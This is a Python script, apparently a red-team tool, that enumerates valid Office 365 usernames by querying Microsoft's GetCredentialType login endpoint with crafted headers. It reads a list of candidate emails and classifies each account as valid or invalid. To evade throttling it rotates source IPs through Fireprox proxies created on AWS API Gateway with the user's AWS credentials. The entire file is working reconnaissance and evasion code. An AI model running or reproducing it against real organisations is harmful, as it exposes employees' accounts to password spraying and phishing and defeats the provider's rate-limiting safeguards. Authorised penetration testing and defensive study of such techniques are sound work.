#!/usr/bin/env python3
'''
Office365 User Enumeration script.
Enumerate valid usernames from Office 365 using the office.com login page.

Author: Quentin Kaiser <quentin@gremwell.com>
Author: Cameron Geehr @BarrelTit0r
Author: Vexance @vexance

Shoutout to @ustayready for the implementation of Fireprox APIs (fire.py)
'''
import random
import re
import string
import argparse
import logging
import requests
from queue import Queue
import threading
import fire
import boto3, botocore

mutex = threading.Lock()
count_queue = Queue()
search_results = set()


try:
    import http.client as http_client
except ImportError:
    import httplib as http_client


def load_usernames(usernames_file: str, domain: str = False) -> list:
    ''' Load usernames from provided file; returns usernames as list<str>'''
    user_list = []
    with open(usernames_file) as file_handle:
        for line in file_handle:
            user = line.strip()
            if domain:
                user = f'{user}@{domain}'
            user_list.append(user)
    return user_list


def o365enum_office(usernames: list, fireprox_url: str) -> None:
    '''Check a list of usernames for validity via office.com method'''
    headers = { "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36" }
    
    # first we open office.com main page
    session = requests.session()
    response = session.get("https://www.office.com", headers=headers)
    # we get the application identifier and session identifier
    client_id = re.findall(b'"appId":"([^"]*)"', response.content)
    # then we request the /login page which will redirect us to the authorize flow
    response = session.get("https://www.office.com/login?es=Click&ru=/&msafed=0", headers=headers, allow_redirects=True)
    hpgid = re.findall(b'hpgid":([0-9]+),', response.content)
    hpgact = re.findall(b'hpgact":([0-9]+),', response.content)

    if not all([client_id, hpgid, hpgact]):
        raise Exception("An error occured when generating headers.")

    # we setup the right headers to blend in
    headers['client-request-id'] = client_id[0]
    headers['Referer'] = response.url
    headers['hpgrequestid'] = response.headers['x-ms-request-id']
    headers['canary'] = ''.join(
        random.choice(
            string.ascii_uppercase + string.ascii_lowercase + string.digits + "-_"
        ) for i in range(248)
    )
    headers['hpgid'] = hpgid[0]
    headers['Accept'] = "application/json"
    headers['hpgact'] = hpgact[0]
    headers['Origin'] = "https://login.microsoftonline.com"

    # we setup the base JSON object to submit
    payload = {
        "isOtherIdpSupported":True,
        "checkPhones":False,
        "isRemoteNGCSupported":True,
        "isCookieBannerShown":False,
        "isFidoSupported":False,
        "originalRequest": re.findall(b'"sCtx":"([^"]*)"', response.content)[0].decode('utf-8'),
        "forceotclogin":False,
        "isExternalFederationDisallowed":False,
        "isRemoteConnectSupported":False,
        "federationFlags":0,
        "isSignup":False,
        "isAccessPassSupported":True
    }

    # Unknown:-1,Exists:0,NotExist:1,Throttled:2,Error:4,ExistsInOtherMicrosoftIDP:5,ExistsBothIDPs:6
    ifExistsResultCodes = {"-1": "UNKNOWN", "0": "VALID_USER", "1": "INVALID_USER", "2": "THROTTLE", "4": "ERROR", "5": "VALID_USER_DIFFERENT_IDP", "6": "VALID_USER"}
    # 1:Unknown,2:Consumer,3:Managed,4:Federated,5:CloudFederated
    domainType = {"1": "UNKNOWN", "2": "COMMERCIAL", "3": "MANAGED", "4": "FEDERATED", "5": "CLOUD_FEDERATED"}
    environments = dict()
    for username in usernames:
        # Check to see if this domain has already been checked
        # If it's managed, it's good to go and we can proceed
        # If it's anything else, don't bother checking
        # If it hasn't been checked yet, look up that user and get the domain info back
        domain = username[username.rfind('@')+1:] if ('@' in username) else ''
        if not domain in environments or environments[domain] == "MANAGED":
            payload["username"] = username
            response = session.post(fireprox_url, headers=headers, json=payload)
            if response.status_code == 200:
                throttleStatus = int(response.json()['ThrottleStatus'])
                ifExistsResult = str(response.json()['IfExistsResult'])
                environments[domain] = domainType[str(response.json()['EstsProperties']['DomainType'])]

                if environments[domain] == "MANAGED":
                    # NotThrottled:0,AadThrottled:1,MsaThrottled:2
                    if not throttleStatus == 0:
                        print("POSSIBLE THROTTLE DETECTED ON REQUEST FOR {}".format(username))
                    print("{} {}".format(username, ifExistsResultCodes[ifExistsResult]))
                else:
                    print("{} DOMAIN TYPE {} NOT SUPPORTED".format(username, environments[domain]))
            else:
                print("{} REQUEST ERROR".format(username))
        else:
            print("{} DOMAIN TYPE {} NOT SUPPORTED".format(username, environments[domain]))


def prep_proxy(args: argparse.Namespace, url: str) -> fire.FireProx:
    """Prepares Fireprox proxy object based off supplied / located AWS keys"""
    ns = argparse.Namespace()
    ns.profile_name = args.profile # ('--profile_name',default=args.profile)
    ns.access_key = args.access_key    # parser.add_argument('--access_key',default=args.access_key)
    ns.secret_access_key = args.secret_key    # parser.add_argument('--secret_access_key',default=args.secret_key)
    ns.session_token = args.session_token # parser.add_argument('--session_token',default=args.session_token)
    ns.region = args.region    # parser.add_argument('--region',default=args.region)
    ns.command = 'create'    # parser.add_argument('--command',default='create')
    ns.api_id = None    # parser.add_argument('--api_id',default=None)
    ns.url = url    # parser.add_argument('--url', default=url)
    return fire.FireProx(ns, 'This is a useless help message :(')


def list_fireprox_apis(fp: fire.FireProx) -> list:
    """Lists active Fireprox APIs within the account; returns API Ids of said proxies"""
    res = fp.list_api()
    return [entry.get('id', '') for entry in res]


def delete_fireprox_apis(fp: fire.FireProx) -> list:
    """Removes all Fireprox APIs within an AWS account"""
    print('[+] Listing Fireprox APIs prior to deletion')
    ids = list_fireprox_apis(fp)
    for prox in ids:
        print(f'[+] Attempting to delete API \'{prox}\'')
        fp.delete_api(prox)
    print('[+] Fireprox APIs following deletion:')
    return list_fireprox_apis(fp) # Should be empty list []
    

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Office365 User Enumeration Script')
    parser.add_argument('command',help='Module / command to run [list,delete,enum]')
    parser.add_argument('-u', '--users',default=False,required=False,help="Required for 'enum' module; File containing list of users / emails to enumerate")
    parser.add_argument('-d', '--domain',default=False,required=False,help="Email domain if not already included within user file")
    parser.add_argument('--static', default=False,required=False,action='store_true',help="Disable IP rotation via Fireprox APIs; O365 will throttle after ~100 requests")
    parser.add_argument('-v', '--verbose', default=False, action='store_true',help='Enable verbose output at urllib level')
    parser.add_argument('--profile',default='default',help='AWS profile within ~/.aws/credentials to use [default: default]')
    parser.add_argument('--access-key', default=None,required=False,help='AWS access key id for fireprox API creation')
    parser.add_argument('--secret-key',default=None,required=False,help='AWS secret access key for fireprox API creation')
    parser.add_argument('--session-token',default=None,required=False,help='AWS session token for assumed / temporary roles')
    parser.add_argument('--region',default='us-east-1',required=False,help='AWS region to which fireprox API will be deployed [default: us-east-1]')
    args = parser.parse_args()

    # Verbosity settings
    if args.verbose:
        http_client.HTTPConnection.debuglevel = 1
        logging.basicConfig(format="%(asctime)s: %(levelname)s: %(module)s: %(message)s")
        logging.getLogger().setLevel(logging.DEBUG)
        requests_log = logging.getLogger("requests.packages.urllib3")
        requests_log.setLevel(logging.DEBUG)
        requests_log.propagate = True

    # Fetch AWS access key info
    try:
        if (any([args.access_key, args.secret_key, args.session_token])):
            aws_session = boto3.Session(args.access_key, args.secret_key, args.session_token)
        else:
            aws_session = boto3.Session(profile_name=args.profile)
        args.access_key = aws_session.get_credentials().access_key
        args.secret_key = aws_session.get_credentials().secret_key
        args.session_token = aws_session.get_credentials().token
    except botocore.exceptions.ProfileNotFound as err:
        print(f'[x] {err}. Specify credentials here or include them as command arguments')
        args.access_key = input('\tAWS Access Key Id: ')
        args.secret_key = input('\tAWS Secret Access Key: ')

    
    fp = prep_proxy(args, 'https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US')
    
    # Run 'module'
    if (args.command == 'list'):
        list_fireprox_apis(fp)
    elif (args.command == 'delete'):
        delete_fireprox_apis(fp)
    elif (args.command == 'enum'):
        # Select either a fireprox API to rotate IPs or use the client's actual public IP
        try:
            if (args.static):
                endpoint = 'https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US'
            else:
                endpoint = fp.create_api('https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US')
            
            users = load_usernames(args.users, args.domain)
            o365enum_office(users, endpoint)
        except Exception as err: # Cleanup proxies after each run
            print(f'[x] {err}; Deleting Fireprox APIs')
            delete_fireprox_apis(fp)
        except KeyboardInterrupt as err:
            print('[+] Interrupt detected - deleting Fireprox APIs - CTRL-C again to force quit')
            delete_fireprox_apis(fp)
        
    else:
        print(f'[x] Invalid option \'{args.command}\' is not in [list,delete,enum]')
        parser.print_help()

    exit()
